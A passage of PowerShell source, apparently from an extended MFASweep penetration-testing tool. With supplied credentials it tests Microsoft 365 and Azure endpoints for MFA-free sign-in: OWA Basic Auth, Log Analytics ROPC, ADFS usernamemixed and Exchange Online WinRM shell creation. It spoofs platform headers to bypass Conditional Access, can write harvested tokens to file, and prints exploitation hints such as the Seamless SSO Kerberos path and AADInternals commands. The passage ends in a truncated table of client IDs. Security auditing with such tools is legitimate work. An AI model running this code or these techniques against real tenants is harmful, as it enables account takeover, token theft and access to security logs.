        Write-Host -ForegroundColor DarkGreen "[***] NOTE: OWA Basic Auth bypasses MFA entirely. Legacy auth policy should block this."
        $global:owaresult = "YES"
    } elseif ($webrequest -and $webrequest.StatusCode -eq 401) {
        Write-Host -ForegroundColor Red "[*] OWA returned 401 - Basic Auth credentials rejected or Basic Auth is disabled for this account."
    } elseif ($webrequest -and ($webrequest.StatusCode -eq 302 -or $webrequest.StatusCode -eq 301)) {
        $location = $webrequest.Headers["Location"]
        if ($location -match "login.microsoftonline.com|login.microsoft.com") {
            Write-Host -ForegroundColor Green "[*] OWA redirected to AAD modern auth - Basic Auth appears blocked (modern auth enforced)."
        } else {
            Write-Host -ForegroundColor Yellow "[*] OWA returned redirect to: $location (Basic Auth status unclear)."
        }
    } elseif ($RespErr -match "401") {
        Write-Host -ForegroundColor Red "[*] OWA Basic Auth blocked - 401 from error variable."
    } else {
        Write-Host -ForegroundColor Yellow "[*] OWA unexpected response for $Username. Status: $(if ($webrequest) { $webrequest.StatusCode } else { 'no response' })"
    }
}


Function Invoke-LogAnalyticsAuth {
<#
.SYNOPSIS
    Tests Azure Log Analytics / Microsoft Sentinel API access via ROPC.
    Resource: https://api.loganalytics.io - provides access to Log Analytics workspace data
    including Azure Activity Logs, Sentinel incidents, sign-in logs, and custom log tables.
    Access to this endpoint can expose the entire security monitoring posture.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Azure Log Analytics / Sentinel API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Azure Log Analytics API via ROPC (api.loganalytics.io)..."

    $Resource = "https://api.loganalytics.io"
    $ClientId  = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"   # Azure CLI

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained a Log Analytics token without MFA. Sentinel incidents, sign-in logs, and security events may be queryable."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Use this token against https://api.loganalytics.io/v1/workspaces/{id}/query with a KQL query to read workspace data."
        $global:loganalyticsresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Log Analytics ROPC failed - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Log Analytics - MFA required."; $global:loganalyticsresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Log Analytics - CA MFA required."; $global:loganalyticsresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Log Analytics for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Log Analytics - password is expired."; $global:loganalyticsresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Log Analytics: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-ADFSUsernameMixedAuth {
<#
.SYNOPSIS
    Tests the on-premises ADFS usernamemixed WS-Trust endpoint.
    Unlike windowstransport (Kerberos), usernamemixed accepts a plaintext UsernameToken
    over HTTPS and has NO MFA support by design. The ADFS server URL is auto-discovered
    from the tenant realm. Only applicable to federated (ADFS) domains.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)] [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- ADFS UsernameMixed WS-Trust (on-prem) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Discovering ADFS server and testing usernamemixed endpoint..."

    $realmCheck = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$Username&xml=1" -ErrorAction SilentlyContinue
    if (-not $realmCheck) {
        Write-Host -ForegroundColor Red "[*] ADFS UsernameMixed: could not reach getuserrealm endpoint."
        return
    }

    try { [xml]$realm = $realmCheck.Content } catch {
        Write-Host -ForegroundColor Red "[*] ADFS UsernameMixed: could not parse realm response."
        return
    }

    if ($realm.RealmInfo.NameSpaceType -ne "Federated") {
        Write-Host -ForegroundColor Yellow "[*] Domain is not Federated (ADFS). UsernameMixed test not applicable."
        $global:adfsusernamemixedresult = "N/A"
        return
    }

    $authUrl = $realm.RealmInfo.AuthUrl
    if (-not $authUrl) {
        Write-Host -ForegroundColor Red "[*] ADFS UsernameMixed: could not retrieve AuthUrl from realm info."
        return
    }

    [uri]$authUri = $authUrl
    $adfsHost = $authUri.Host
    $wsUrl = "https://$adfsHost/adfs/services/trust/2005/usernamemixed"
    Write-Host -ForegroundColor Yellow "[*] Targeting ADFS usernamemixed endpoint: $wsUrl"

    $xmlUsername = [System.Net.WebUtility]::HtmlEncode($Username)
    $xmlPassword = [System.Net.WebUtility]::HtmlEncode($Password)
    $soapBody = @"
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:a='http://www.w3.org/2005/08/addressing' xmlns:u='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd'>
  <s:Header>
    <a:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
    <a:To s:mustUnderstand='1'>$wsUrl</a:To>
    <o:Security s:mustUnderstand='1' xmlns:o='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'>
      <o:UsernameToken>
        <o:Username>$xmlUsername</o:Username>
        <o:Password Type='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText'>$xmlPassword</o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body>
    <t:RequestSecurityToken xmlns:t='http://schemas.xmlsoap.org/ws/2005/02/trust'>
      <wsp:AppliesTo xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy'>
        <a:EndpointReference><a:Address>urn:federation:MicrosoftOnline</a:Address></a:EndpointReference>
      </wsp:AppliesTo>
      <t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType>
      <t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
    </t:RequestSecurityToken>
  </s:Body>
</s:Envelope>
"@

    $headers = @{ "Content-Type" = "application/soap+xml; charset=utf-8"; "SOAPAction" = "http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue" }

    try {
        $resp = Invoke-MFASweepWebRequest -Uri $wsUrl -Method Post -Headers $headers -Body $soapBody -ErrorVariable RespErr
        if ($resp -and $resp.StatusCode -eq 200 -and $resp.Content -match "RequestedSecurityToken") {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained a token via ADFS usernamemixed. This endpoint has NO MFA."
            Write-Host -ForegroundColor DarkGreen "[***] NOTE: The token can be exchanged for Azure AD access tokens via AADInternals Get-AADIntAccessTokenForAADGraph."
            $global:adfsusernamemixedresult = "YES"
        } elseif ($resp -and $resp.Content -match "FailedAuthentication" -or $RespErr -match "401") {
            Write-Host -ForegroundColor Red "[*] ADFS UsernameMixed: authentication failed - invalid credentials."
        } elseif ($resp -and $resp.Content -match "RequestFailed") {
            Write-Host -ForegroundColor Yellow "[*] ADFS UsernameMixed: endpoint reachable but request failed (endpoint may be disabled or require additional claims)."
        } else {
            Write-Host -ForegroundColor Yellow "[*] ADFS UsernameMixed: unexpected response from $wsUrl. Status: $(if ($resp) { $resp.StatusCode } else { 'no response' })"
        }
    } catch {
        Write-Host -ForegroundColor Red "[*] ADFS UsernameMixed connection error: $_"
    }
}


Function Invoke-AzureADSSOCheck {
<#
.SYNOPSIS
    Passive check - determines whether Azure AD Seamless Single Sign-On (SSSO) is enabled.
    SSSO allows domain-joined machines to authenticate silently via Kerberos tickets issued for
    the AZUREADSSOACC$ computer account, bypassing MFA for any user on a domain-joined device.
    This check does NOT use credentials - it probes the autologon endpoint and realm metadata.
    If ENABLED, actual exploitation requires being on a domain-joined machine (use AADInternals
    or Rubeus to obtain the Kerberos ticket and exchange it for an access token).
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username
    )

    Write-Host "`r`n"
    Write-Host "---------------- Azure AD Seamless SSO (SSSO) Availability Check ----------------"
    Write-Host -ForegroundColor Yellow "[*] Checking if Azure AD Seamless SSO is enabled for this tenant (no credentials used)..."

    $domain = ($Username -split "@")[1]
    if (-not $domain) {
        Write-Host -ForegroundColor Red "[*] Azure AD SSO check requires a UPN (user@domain). Received: $Username"
        return
    }

    # Check realm metadata for DesktopSsoEnabled flag
    $realmJson = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$Username&json=1" -ErrorAction SilentlyContinue
    $ssoFromRealm = $false
    if ($realmJson -and $realmJson.Content) {
        try {
            $realmData = $realmJson.Content | ConvertFrom-Json
            if ($realmData.DesktopSsoEnabled -eq $true) {
                $ssoFromRealm = $true
                Write-Host -ForegroundColor Green "[*] Realm metadata confirms DesktopSsoEnabled = true for domain '$domain'."
            }
        } catch {}
    }

    # Probe the autologon endpoint - a 401 with Negotiate header means SSSO is active
    $autologonUrl = "https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/windowstransport"
    $probeResp = Invoke-MFASweepWebRequest -Uri $autologonUrl -Method Get -ErrorAction SilentlyContinue -ErrorVariable ProbeErr
    $ssoFromProbe = $false

    if ($probeResp -and $probeResp.StatusCode -eq 401) {
        $wwwAuth = $probeResp.Headers["WWW-Authenticate"]
        if ($wwwAuth -match "Negotiate") {
            $ssoFromProbe = $true
            Write-Host -ForegroundColor Green "[*] Autologon endpoint returned 401 Negotiate - Kerberos authentication is accepted."
        }
    } elseif ($ProbeErr -match "401") {
        $ssoFromProbe = $true
        Write-Host -ForegroundColor Green "[*] Autologon endpoint returned 401 - endpoint is active."
    } elseif ($probeResp -and $probeResp.StatusCode -eq 200) {
        $ssoFromProbe = $true
        Write-Host -ForegroundColor Green "[*] Autologon endpoint returned 200 - endpoint is accessible."
    }

    if ($ssoFromRealm -or $ssoFromProbe) {
        Write-Host -ForegroundColor Green "[*] Azure AD Seamless SSO is ENABLED for domain '$domain'."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Any user on a domain-joined machine can obtain tokens without MFA."
        Write-Host -ForegroundColor DarkGreen "[***] Exploit path: Get Kerberos TGS for AZUREADSSOACC`$, then POST to $autologonUrl"
        Write-Host -ForegroundColor DarkGreen "[***] Tool reference: AADInternals Get-AADIntAccessTokenForAADGraph -UseKerberos"
        $global:aadssocheck = "ENABLED"
    } else {
        Write-Host -ForegroundColor Green "[*] Azure AD Seamless SSO does not appear to be enabled for domain '$domain'."
        $global:aadssocheck = "DISABLED"
    }
}


Function Invoke-ExchangePSBasicAuth {
<#
.SYNOPSIS
    Tests Exchange Online Remote PowerShell Basic Authentication in two layers:
    Layer 1 - HTTP credential check: GET /powershell-liveid/ with Basic Auth header.
              A 200 confirms credentials are valid and Basic Auth is enabled at HTTP level.
    Layer 2 - WinRM shell creation: POST a WS-Management SOAP CreateShell request.
              Only if the shell is created (response contains a ShellId) is full PS access
              confirmed. Many tenants accept HTTP Basic Auth but block WinRM shell creation
              server-side - these are reported separately as "YES (HTTP only)".
    Result values:
      YES (Shell)    = full WinRM shell created, PS cmdlets accessible
      YES (HTTP only)= credentials confirmed, WinRM shell rejected server-side
      NO             = Basic Auth blocked or credentials invalid
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)] [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- Exchange Online Remote PowerShell Basic Auth ----------------"
    Write-Host -ForegroundColor Yellow "[*] Layer 1: Testing HTTP Basic Auth credential acceptance..."

    $endpoint = "https://outlook.office365.com/powershell-liveid/"
    $creds    = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("${Username}:${Password}"))
    $baseHeaders = @{ Authorization = "Basic $creds"; "User-Agent" = "PowerShell/7.4"; Accept = "application/json" }

    $httpResp = Invoke-MFASweepWebRequest -Uri $endpoint -Method Get -Headers $baseHeaders -ErrorVariable RespErr

    # ── Layer 1: HTTP credential check ───────────────────────────────────────
    if ($httpResp -and ($httpResp.StatusCode -eq 302 -or $httpResp.StatusCode -eq 301)) {
        $location = $httpResp.Headers["Location"]
        if ($location -match "login.microsoftonline|login.microsoft.com") {
            Write-Host -ForegroundColor Green "[*] Exchange Online PS: redirected to AAD modern auth - Basic Auth is disabled."
            return
        }
    }

    if ($httpResp -and $httpResp.StatusCode -eq 401) {
        $wwwAuth = $httpResp.Headers["WWW-Authenticate"]
        if ($wwwAuth -match "Basic") {
            Write-Host -ForegroundColor Red "[*] Exchange Online PS: endpoint accepts Basic Auth but credentials were rejected (401)."
        } else {
            Write-Host -ForegroundColor Green "[*] Exchange Online PS: Basic Auth not offered by server - modern auth enforced."
        }
        return
    }

    if ($RespErr -match "401") {
        Write-Host -ForegroundColor Red "[*] Exchange Online PS: 401 - credentials rejected or Basic Auth disabled."
        return
    }

    if (-not ($httpResp -and $httpResp.StatusCode -eq 200)) {
        Write-Host -ForegroundColor Yellow "[*] Exchange Online PS: unexpected HTTP response. Status: $(if ($httpResp) { $httpResp.StatusCode } else { 'no response' })"
        return
    }

    Write-Host -ForegroundColor Green "[*] Layer 1 PASSED: $Username credentials accepted via HTTP Basic Auth (no MFA at HTTP layer)."
    Write-Host -ForegroundColor Yellow "[*] Layer 2: Testing WinRM shell creation..."

    # ── Layer 2: WinRM shell creation SOAP probe ──────────────────────────────
    $msgId   = [guid]::NewGuid().ToString().ToUpper()
    $soapHeaders = @{
        Authorization  = "Basic $creds"
        "User-Agent"   = "PowerShell/7.4"
        "Content-Type" = "application/soap+xml;charset=UTF-8"
        "WSMANACTION"  = "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create"
    }
    $shellSoap = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:To>$endpoint</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
    <a:ReplyTo><a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>
    <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
    <w:MaxEnvelopeSize s:mustUnderstand="true">153600</w:MaxEnvelopeSize>
    <a:MessageID>uuid:$msgId</a:MessageID>
    <w:Locale xml:lang="en-US" s:mustUnderstand="false"/>
    <w:OperationTimeout>PT20S</w:OperationTimeout>
    <w:OptionSet><w:Option Name="protocolversion">2.3</w:Option></w:OptionSet>
  </s:Header>
  <s:Body>
    <rsp:Shell>
      <rsp:InputStreams>stdin</rsp:InputStreams>
      <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
    </rsp:Shell>
  </s:Body>
</s:Envelope>
"@

    try {
        $shellResp = Invoke-MFASweepWebRequest -Uri $endpoint -Method Post -Headers $soapHeaders -Body $shellSoap -ErrorVariable ShellErr
        if ($shellResp -and $shellResp.StatusCode -eq 200 -and $shellResp.Content -match "ShellId") {
            Write-Host -ForegroundColor Green "[*] Layer 2 PASSED: WinRM shell created! Full Exchange Online PS access confirmed without MFA."
            Write-Host -ForegroundColor DarkGreen "[***] Connect: Import-Module EXO 2.0.5; Connect-ExchangeOnline -Credential `$cred"
            $global:exchangepsresult = "YES (Shell)"
        } elseif ($shellResp -and $shellResp.Content -match "WSManFault|ShellCreationRejected|2144108212") {
            Write-Host -ForegroundColor Green "[*] Layer 2 BLOCKED: Credentials confirmed valid but server rejected WinRM shell creation."
            Write-Host -ForegroundColor DarkGreen "[***] NOTE: HTTP Basic Auth is active (credentials confirmed). Shell creation is blocked server-side."
            $global:exchangepsresult = "YES (HTTP only)"
        } elseif ($ShellErr -match "2144108212|ShellCreation") {
            Write-Host -ForegroundColor Green "[*] Layer 2 BLOCKED: Credentials valid, WinRM shell rejected by server (-2144108212)."
            $global:exchangepsresult = "YES (HTTP only)"
        } else {
            Write-Host -ForegroundColor Yellow "[*] Layer 2: unexpected shell response. Reporting HTTP-layer confirmation only."
            $global:exchangepsresult = "YES (HTTP only)"
        }
    } catch {
        Write-Host -ForegroundColor Yellow "[*] Layer 2: shell probe error: $_"
        Write-Host -ForegroundColor Green "[*] Reporting HTTP-layer credential confirmation only."
        $global:exchangepsresult = "YES (HTTP only)"
    }
}


Function Invoke-CBAAvailabilityCheck {
<#
.SYNOPSIS
    Passive check - determines whether Certificate-Based Authentication (CBA) is configured.
    CBA allows users to authenticate with an X.509 certificate instead of a password and
    satisfies MFA requirements by itself (phishing-resistant MFA). If CBA is enabled and
    a certificate can be obtained (from a compromised device or PKI), it can be used to
    authenticate without knowing the user's password or having their MFA device.
    This check does NOT use credentials - it probes the tenant's mTLS/CBA endpoints.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username
    )

    Write-Host "`r`n"
    Write-Host "---------------- Certificate-Based Authentication (CBA) Availability Check ----------------"
    Write-Host -ForegroundColor Yellow "[*] Checking if CBA (X.509 certificate auth) is configured for this tenant (no credentials used)..."

    $domain = ($Username -split "@")[1]
    if (-not $domain) {
        Write-Host -ForegroundColor Red "[*] CBA check requires a UPN (user@domain). Received: $Username"
        return
    }

    $cbaFound = $false

    # Check the tenant's OpenID Connect discovery document for CBA indicators
    $oidcUrl = "https://login.microsoftonline.com/$domain/.well-known/openid-configuration"
    $oidcResp = Invoke-MFASweepWebRequest -Uri $oidcUrl -ErrorAction SilentlyContinue
    if ($oidcResp -and $oidcResp.Content) {
        try {
            $oidc = $oidcResp.Content | ConvertFrom-Json
            if ($oidc.certificate_authorities -or $oidc.mtls_endpoint_aliases) {
                $cbaFound = $true
                Write-Host -ForegroundColor Green "[*] OpenID config contains CBA/mTLS indicators (certificate_authorities or mtls_endpoint_aliases)."
            }
        } catch {}
    }

    # Probe the dedicated CBA (certauth) subdomain
    $certAuthUrl = "https://certauth.login.microsoftonline.com/$domain/.well-known/openid-configuration"
    $certResp = Invoke-MFASweepWebRequest -Uri $certAuthUrl -ErrorAction SilentlyContinue
    if ($certResp -and $certResp.StatusCode -eq 200 -and $certResp.Content -match "issuer") {
        $cbaFound = $true
        Write-Host -ForegroundColor Green "[*] CBA subdomain (certauth.login.microsoftonline.com) is active and returned a valid OpenID configuration."
    }

    # Check the tenant's OAuth2 v2 token endpoint metadata for CBA
    $metaUrl = "https://login.microsoftonline.com/$domain/v2.0/.well-known/openid-configuration"
    $metaResp = Invoke-MFASweepWebRequest -Uri $metaUrl -ErrorAction SilentlyContinue
    if ($metaResp -and $metaResp.Content -match "certauth") {
        $cbaFound = $true
        Write-Host -ForegroundColor Green "[*] v2.0 OpenID configuration references CBA (certauth) endpoint."
    }

    if ($cbaFound) {
        Write-Host -ForegroundColor Green "[*] Certificate-Based Authentication (CBA) appears to be AVAILABLE for this tenant."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: If a user certificate can be obtained (from compromised device, stolen smart card, or rogue PKI), it authenticates without password or MFA push."
        Write-Host -ForegroundColor DarkGreen "[***] CBA satisfies phishing-resistant MFA - Conditional Access policies requiring MFA are satisfied by the cert alone."
        $global:cbaresult = "AVAILABLE"
    } else {
        Write-Host -ForegroundColor Green "[*] No CBA configuration detected for domain '$domain'."
        $global:cbaresult = "NOT_DETECTED"
    }
}


Function Invoke-PlatformCABypass {
<#
.SYNOPSIS
    Tests whether Conditional Access device-platform conditions have gaps by sending ROPC
    token requests with different User-Agent and MSAL platform headers.

    CA evaluates the device platform from the User-Agent and x-client-sku headers on each
    token request. A common misconfiguration: policies enforce MFA for "Windows" and "macOS"
    but omit "Linux", "Chrome OS", or leave a platform unmatched (Unknown). Sending a request
    that claims to be a Linux or Chrome OS MSAL client can bypass those requirements.

    Each platform is tested against Microsoft Graph. Results show per-platform outcome so you
    can identify exactly which platform condition is missing from the tenant's CA policies.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)] [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- Conditional Access Platform-Condition Bypass Test ----------------"
    Write-Host -ForegroundColor Yellow "[*] Testing ROPC with per-platform User-Agent and MSAL headers against Microsoft Graph..."
    Write-Host -ForegroundColor Yellow "[*] A 'YES' for any platform means that platform is not covered by a CA MFA requirement."

    # Platform definitions: name -> headers to inject
    $platforms = [ordered]@{
        "Linux   (MSAL.Python)"  = @{ "User-Agent" = "python-requests/2.31.0"; "x-client-sku" = "MSAL.Python";   "x-client-ver" = "1.6.1";  "x-client-os" = "Linux"       }
        "Linux   (MSAL.NetCore)" = @{ "User-Agent" = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"; "x-client-sku" = "MSAL.NetCore"; "x-client-ver" = "4.58.1"; "x-client-os" = "Linux 5.15.0" }
        "macOS   (MSAL.Mac)"     = @{ "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko)"; "x-client-sku" = "MSAL.Mac"; "x-client-ver" = "1.3.2"; "x-client-os" = "macOS 14.2" }
        "ChromeOS"               = @{ "User-Agent" = "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" }
        "Android (MSAL.Android)" = @{ "User-Agent" = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"; "x-client-sku" = "MSAL.Android"; "x-client-ver" = "4.4.0"; "x-client-os" = "Android 14" }
        "iOS     (MSAL.iOS)"     = @{ "User-Agent" = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"; "x-client-sku" = "MSAL.iOS"; "x-client-ver" = "1.2.22"; "x-client-os" = "iOS 17.1" }
        "Windows (MSAL.Net)"     = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"; "x-client-sku" = "MSAL.Net"; "x-client-ver" = "4.58.1"; "x-client-os" = "Windows 10.0.19045" }
        "Unknown platform"       = @{ "User-Agent" = "MFASweep/3.0" }
    }

    $Resource = "https://graph.microsoft.com"
    $ClientId  = "1b730954-1685-4b74-9bfd-dac224a7b894"   # Azure AD PowerShell

    $bypassFound     = $false
    $bestPlatform    = $null
    $platformResults = @()

    foreach ($platformName in $platforms.Keys) {
        $extraHeaders = $platforms[$platformName]

        $postHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
        foreach ($k in $extraHeaders.Keys) { $postHeaders[$k] = $extraHeaders[$k] }

        $bodyParams = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }

        $resp = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $postHeaders -Body $bodyParams -ErrorVariable RespErr

        $outcome = $null
        if ($resp -and $resp.StatusCode -eq "200") {
            $outcome = "YES"
            $bypassFound  = $true
            $bestPlatform = $platformName.Trim()
            Write-Host -ForegroundColor Green "  [$($platformName)] SUCCESS! Token issued without MFA - CA policy does NOT cover this platform."
        } elseif ($RespErr -match "AADSTS50126") {
            $outcome = "INVALID_CREDS"
            Write-Host -ForegroundColor Red   "  [$($platformName)] Invalid credentials."
            break
        } elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")) {
            $outcome = "MFA_REQUIRED"
            Write-Host -ForegroundColor Cyan  "  [$($platformName)] MFA required - CA policy covers this platform."
        } elseif ($RespErr -match "AADSTS53003") {
            $outcome = "CA_BLOCK"
            Write-Host -ForegroundColor Yellow "  [$($platformName)] Conditional Access blocked request entirely."
        } elseif ($RespErr -match "AADSTS50158") {
            $outcome = "CA_MFA"
            Write-Host -ForegroundColor Cyan  "  [$($platformName)] CA MFA challenge (DUO/3rd-party) - covered."
        } else {
            $outcome = "UNKNOWN"
            Write-Host -ForegroundColor Yellow "  [$($platformName)] Unexpected response: $RespErr"
        }
        $platformResults += [pscustomobject]@{ Platform = $platformName.Trim(); Outcome = $outcome }
    }

    Write-Host ""
    if ($bypassFound) {
        Write-Host -ForegroundColor Green "[*] PLATFORM BYPASS FOUND. Platform '$bestPlatform' bypasses CA MFA requirement."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Add a CA policy condition covering '$bestPlatform' or block unsupported platforms."
        $global:platformcabypassresult = "YES ($bestPlatform)"
    } else {
        $allMFA  = ($platformResults | Where-Object { $_.Outcome -eq "MFA_REQUIRED" -or $_.Outcome -eq "CA_MFA" }).Count
        $blocked = ($platformResults | Where-Object { $_.Outcome -eq "CA_BLOCK" }).Count
        Write-Host -ForegroundColor Green "[*] No platform bypass found. All tested platforms are covered by CA ($allMFA MFA-required, $blocked blocked)."
        $global:platformcabypassresult = "NO"
    }
}


$GuidNames = @{
    "0032593d-6a05-4847-8ca4-4b6220ed2a1e" = "Microsoft_Azure_ELMAdmin"
    "00b41c95-dab0-4487-9791-b9d2c32c80f2" = "Office 365 Management"
    "00daac17-a7ce-4990-a494-a7120e0b5c6c" = "CloudNativeTesting Portal"
    "0140a36d-95e1-4df5-918c-ca7ccd1fafc9" = "Microsoft Developer Portal"
    "01941e19-f441-4835-b4a0-546a1da6d99c" = "Microsoft_Azure_Education"
    "038ddad9-5bbe-4f64-b0cd-12434d1e633b" = "ZTNA Network Access Client"
    "03e204c9-d1db-4685-895c-00603f8bfb98" = "Microsoft_Azure_Network"
    "03ec703c-bc36-4494-b8ab-73e84692823a" = "Microsoft_Azure_Compute"
    "04045bf5-8e9f-4019-8613-af68af46ff56" = "Vision Studio"
    "041e4c2d-ba3e-46a1-9347-5bc4054c8af4" = "Power Automate Desktop GCC"
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46" = "Microsoft Azure CLI"
    "04f0c124-f2bc-4f59-8241-bf6df9866bbd" = "Visual Studio"
    "05c7489d-bc20-4405-a3b4-cf0743f090ca" = "PlacesCmdletModule"
    "065d9450-1e87-434e-ac2f-69af271549ed" = "Power Platform Admin Center"
    "0673e721-d668-419d-b8c7-709bfd1e7928" = "Configuration Manager portal extension"
    "067cf55c-59b8-432f-a11d-d904de42e97d" = "Durable Task Scheduler Dashboard"
    "08617521-6d76-4eb0-b336-a9efef0d8a68" = "Microsoft_Azure_Kusto"
    "087fca6e-4606-4d41-b3f6-5ebdf75b8b4c" = "Kubernetes Runtime RP"
    "08e18876-6177-487e-b8b5-cf950c1e598c" = "SharePoint Online Web Client Extensibility"
    "0922ef46-e1b9-4f7e-9134-9ad00547eb41" = "Loop"
    "0973ecd5-7828-4430-9548-bb2331536767" = "Feedback Hub"
    "09abbdfd-ed23-44ee-a2d9-a627aa1c90f3" = "ProjectWorkManagement"
    "0a2057a8-149c-40ca-859e-98de032535fb" = "Microsoft Azure Marketplace"
    "0b107b34-72a8-4081-a8ca-f3ecb0937531" = "Microsoft Azure"
    "0bfc4568-a4ba-4c58-bd3e-5d3e76bd7fff" = "Dynamics 365 AI for Customer Insights"
    "0c1307d4-29d6-4389-a11c-5cbe7f65d7fa" = "Microsoft Azure"
    "0c50de64-92f9-4ad5-bf88-1af4b40c3b8e" = "Microsoft_Azure_ContainerService"
    "0dc2408a-bbc0-4238-871e-13b372f0200f" = "Windows Insider Program"
    "0e25d998-b19a-4080-811c-d74d60d65e42" = "Purview Information Protection Client"
    "0e90d0b8-039a-4936-a6f4-d25dd510be5d" = "Message Recall"
    "0ec893e0-5785-4de6-99da-4ed124e5296c" = "Microsoft 365 Copilot"
    "0f60ca62-b2fd-47d7-85aa-b2a71d6d658e" = "Dataverse Portal - Prod"
    "0fac0caa-efd0-46cc-a6df-945f8c5eae54" = "Microsoft Azure Batch Portal Extension"
    "0fc12b9a-5463-4b87-8f10-765fecb39990" = "SQL Copilot PPE"
    "0fdc37af-a69e-49ea-8ee9-a1d69e7edb0c" = "Microsoft_Azure_Resources"
